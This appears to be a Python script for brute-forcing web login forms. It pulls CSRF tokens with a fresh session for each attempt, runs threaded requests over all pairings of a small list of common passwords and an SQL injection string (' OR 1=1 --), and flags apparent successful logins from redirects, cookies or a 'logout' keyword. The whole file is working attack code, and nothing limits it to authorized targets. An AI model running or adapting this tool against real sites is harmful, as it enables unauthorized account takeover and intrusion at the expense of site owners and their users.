import requests
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------
# CONFIG
# ----------------------------
PAYLOADS = [
    "admin",
    "password",
    "' OR 1=1 --",
    "admin2",
    "1234"
]

THREADS = 5

# ----------------------------
# TOKEN FIELD
# ----------------------------
def get_token_field(form):
    for inp in form["inputs"]:
        if "token" in inp.get("name", "").lower():
            return inp["name"]
    return None

# ----------------------------
# FETCH PAGE + TOKEN (NEW SESSION EACH TIME)
# ----------------------------
def fetch_page_and_token(session, url, token_field):
    r = session.get(url, timeout=5)

    token_value = None
    if token_field:
        match = re.search(
            rf"name=['\"]{token_field}['\"] value=['\"](.*?)['\"]",
            r.text
        )
        if match:
            token_value = match.group(1)

    return token_field, token_value

# ----------------------------
# BUILD DATA
# ----------------------------
def build_data(form, user, pwd, token_name, token_value):
    d = {}

    for inp in form["inputs"]:
        name = inp["name"]

        if name == form["fields"]["username"]:
            d[name] = user

        elif name == form["fields"]["password"]:
            d[name] = pwd

        elif token_name and name == token_name:
            d[name] = token_value

        else:
            d[name] = inp.get("value", "")

    return d

# ----------------------------
# SEND (NO REDIRECT FOLLOW)
# ----------------------------
def send(session, url, data):
    start = time.time()

    r = session.post(
        url,
        data=data,
        timeout=5,
        allow_redirects=False  # 🔥 IMPORTANT
    )

    end = time.time()
    return r, (end - start)

# ----------------------------
# EXTRACT FEATURES
# ----------------------------
def extract_features(response, elapsed):
    return {
        "status": response.status_code,
        "length": len(response.text),
        "url": response.headers.get("Location", "NO_REDIRECT"),
        "cookies": response.cookies.get_dict(),
        "time": elapsed,
        "text": response.text[:300]
    }

# ----------------------------
# PRINT OUTPUT
# ----------------------------
def print_result(user, pwd, res):
    print("\n[TEST]", f"{user}:{pwd}")
    print("-" * 50)

    print(f"STATUS   : {res['status']}")
    print(f"LENGTH   : {res['length']}")
    print(f"REDIRECT : {res['url']}")
    print(f"COOKIES  : {res['cookies']}")
    print(f"TIME     : {res['time']:.3f}s")

    print("-" * 50)

# ----------------------------
# 🔥 DETECT LOGIN SUCCESS (STRONG)
# ----------------------------
def is_login_success(res):
    # 1. redirect to index/dashboard
    if res["status"] in [301, 302] and "index" in res["url"]:
        return True

    # 2. session cookie appears
    if len(res["cookies"]) > 0:
        return True

    # 3. keyword fallback
    if "logout" in res["text"].lower():
        return True

    return False

# ----------------------------
# TEST FUNCTION (THREAD SAFE)
# ----------------------------
def test_pair(user, pwd, form):
    findings = []

    # 🔥 NEW SESSION PER REQUEST
    session = requests.Session()

    token_field = get_token_field(form)
    token_name, token_value = fetch_page_and_token(
        session, form["action"], token_field
    )

    data = build_data(form, user, pwd, token_name, token_value)

    r, rt = send(session, form["action"], data)

    res = extract_features(r, rt)

    print_result(user, pwd, res)

    if is_login_success(res):
        print("\n" + "="*60)
        print("[SUCCESS LOGIN DETECTED]")
        print(f"USER: {user} | PASS: {pwd}")
        print("="*60)

        findings.append((user, pwd))

    return findings

# ----------------------------
# MAIN
# ----------------------------
def run_brute_scan(form):
    print("\n[*] STARTING TEST...\n")

    findings = []

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []

        for user in PAYLOADS:
            for pwd in PAYLOADS:
                if user == pwd:
                    continue

                futures.append(
                    executor.submit(test_pair, user, pwd, form)
                )

        for future in as_completed(futures):
            res = future.result()
            if res:
                findings.extend(res)

    print(f"\n[+] TOTAL SUCCESS: {len(findings)}")
    return findings

